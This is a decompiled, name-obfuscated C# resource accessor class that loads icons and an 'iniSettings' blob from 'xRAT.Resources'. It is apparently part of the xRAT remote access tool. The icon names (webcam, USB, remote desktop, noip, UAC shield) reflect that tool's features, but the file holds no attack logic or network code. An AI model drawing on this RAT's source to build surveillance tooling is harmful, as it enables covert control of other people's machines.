﻿using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;

[CompilerGenerated, HideModuleName, DebuggerNonUserCode, GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0"), StandardModule]
internal sealed class Class5
{
    private static CultureInfo cultureInfo_0;
    private static ResourceManager resourceManager_0;

    internal static Bitmap asmUpuOh3()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("classique-skype-icone-5807-16", cultureInfo_0));
    }

    internal static Bitmap smethod_0()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Actions-configure-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_1()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Actions-configure-icon-little", cultureInfo_0));
    }

    internal static Bitmap smethod_10()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("agt_stop", cultureInfo_0));
    }

    internal static Bitmap smethod_11()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Alert-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_12()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("antivirus-bouclier-icone-7839-16", cultureInfo_0));
    }

    internal static Bitmap smethod_13()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("antivirus-bouclier-icone-7839-32", cultureInfo_0));
    }

    internal static Bitmap smethod_14()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Apps-utilities-desktop-extra-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_15()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("asterisk-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_16()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("blue-screen-of-death-ecran-des-fenetres-icone-4629-16", cultureInfo_0));
    }

    internal static Bitmap smethod_17()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("box-open-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_18()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("build", cultureInfo_0));
    }

    internal static Bitmap smethod_19()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("calendar-task-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_2()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Actions-document-save-all-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_20()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Chat-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_21()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("clock-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_22()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Close_2_icon", cultureInfo_0));
    }

    internal static Bitmap smethod_23()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("coins-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_24()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Computer1_256", cultureInfo_0));
    }

    internal static Bitmap smethod_25()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("cool-face-icone-7669-32", cultureInfo_0));
    }

    internal static Bitmap smethod_26()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Device-blockdevice-cubes-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_27()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Download-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_28()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("evil-face-icone-7664-32", cultureInfo_0));
    }

    internal static Bitmap smethod_29()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Exemple", cultureInfo_0));
    }

    internal static Bitmap smethod_3()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Actions-help-about-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_30()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("facebook-icone-8470-16", cultureInfo_0));
    }

    internal static Bitmap smethod_31()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("facial-laugh-icone-4834-32", cultureInfo_0));
    }

    internal static Bitmap smethod_32()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("FAQ-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_33()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("FAQ-icon1", cultureInfo_0));
    }

    internal static Bitmap smethod_34()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("filebrowser", cultureInfo_0));
    }

    internal static Bitmap smethod_35()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("gear-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_36()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("gear-icon1", cultureInfo_0));
    }

    internal static Bitmap smethod_37()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("gg_connecting", cultureInfo_0));
    }

    internal static Bitmap smethod_38()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("ghost-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_39()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("green_button", cultureInfo_0));
    }

    internal static Bitmap smethod_4()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Actions-media-playback-start-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_40()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("happy-smiley-red-icone-9796-32", cultureInfo_0));
    }

    internal static Bitmap smethod_41()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("homme-costume-cravate-utilisateur-icone-7362-32", cultureInfo_0));
    }

    internal static Bitmap smethod_42()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("icon_48x48_icon (1)", cultureInfo_0));
    }

    internal static Bitmap smethod_43()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("icon_48x48_icon (1)1", cultureInfo_0));
    }

    internal static byte[] smethod_44()
    {
        return (byte[]) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("iniSettings", cultureInfo_0));
    }

    internal static Bitmap smethod_45()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Internet_128", cultureInfo_0));
    }

    internal static Bitmap smethod_46()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("itunes2aqua", cultureInfo_0));
    }

    internal static Bitmap smethod_47()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("key-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_48()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("la-protection-bouclier-icone-9170-16", cultureInfo_0));
    }

    internal static Bitmap smethod_49()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("loading_circle", cultureInfo_0));
    }

    internal static Bitmap smethod_5()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Actions-view-refresh-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_50()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Locker-blue", cultureInfo_0));
    }

    internal static Bitmap smethod_51()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("messagebox_info_256", cultureInfo_0));
    }

    internal static Bitmap smethod_52()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("microphone-plus-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_53()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Mimetypes-application-x-executable-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_54()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("mouse-error-icone-4466-16", cultureInfo_0));
    }

    internal static Bitmap smethod_55()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("mouse-error-icone-4466-161", cultureInfo_0));
    }

    internal static Bitmap smethod_56()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("mouse-icone-9003-16 (1)", cultureInfo_0));
    }

    internal static Bitmap smethod_57()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("music-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_58()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("navigateur-terre-globe-internet-web-icone-3747-32", cultureInfo_0));
    }

    internal static Bitmap smethod_59()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("navigateur-terre-globe-internet-web-icone-3747-321", cultureInfo_0));
    }

    internal static Bitmap smethod_6()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("agt_action_fail", cultureInfo_0));
    }

    internal static Bitmap smethod_60()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("network-connections-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_61()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Network-Globe-Connected-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_62()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Network-Globe-Connected-icon1", cultureInfo_0));
    }

    internal static Bitmap smethod_63()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Network-Panel-Settings-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_64()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Network-Remote-Desktop-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_65()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("noip", cultureInfo_0));
    }

    internal static Bitmap smethod_66()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("page-white-paint-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_67()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Pause-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_68()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("plugin-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_69()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("png-file-icon (1)", cultureInfo_0));
    }

    internal static Bitmap smethod_7()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("agt_action_success", cultureInfo_0));
    }

    internal static Bitmap smethod_70()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("quick_restart", cultureInfo_0));
    }

    internal static Bitmap smethod_71()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("red_button", cultureInfo_0));
    }

    internal static Bitmap smethod_72()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("robot-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_73()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("RSS-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_74()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("RSS-icon1", cultureInfo_0));
    }

    internal static Bitmap smethod_75()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("rss-image-flux-reflet-10-icone-4690-32", cultureInfo_0));
    }

    internal static Bitmap smethod_76()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("script-icone-9524-16", cultureInfo_0));
    }

    internal static Bitmap smethod_77()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("shield-arrow-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_78()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("shutdown", cultureInfo_0));
    }

    internal static Bitmap smethod_79()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("skype-icone-4316-16", cultureInfo_0));
    }

    internal static Bitmap smethod_8()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("agt_softwareD", cultureInfo_0));
    }

    internal static Bitmap smethod_80()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("skype-icone-5820-16", cultureInfo_0));
    }

    internal static Bitmap smethod_81()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("skype-icone-9016-16", cultureInfo_0));
    }

    internal static Bitmap smethod_82()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("smile-face-icone-9694-32", cultureInfo_0));
    }

    internal static Bitmap smethod_83()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("start-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_84()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Status-dialog-error-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_85()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("stop-red-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_86()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("success_icon", cultureInfo_0));
    }

    internal static Bitmap smethod_87()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("systemsettings", cultureInfo_0));
    }

    internal static Bitmap smethod_88()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("uac-shield", cultureInfo_0));
    }

    internal static Bitmap smethod_89()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Upload-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_9()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("agt_start_here", cultureInfo_0));
    }

    internal static Bitmap smethod_90()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("USB-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_91()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("webcam-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_92()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Window-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_93()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("windows-icon", cultureInfo_0));
    }

    internal static Bitmap smethod_94()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("winmov", cultureInfo_0));
    }

    internal static Bitmap smethod_95()
    {
        return (Bitmap) RuntimeHelpers.GetObjectValue(ResourceManager_0.GetObject("Zoom-icon", cultureInfo_0));
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static CultureInfo CultureInfo_0
    {
        set
        {
            cultureInfo_0 = value;
        }
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static ResourceManager ResourceManager_0
    {
        get
        {
            if (object.ReferenceEquals(resourceManager_0, null))
            {
                ResourceManager manager = new ResourceManager("xRAT.Resources", typeof(Class5).Assembly);
                resourceManager_0 = manager;
            }
            return resourceManager_0;
        }
    }
}

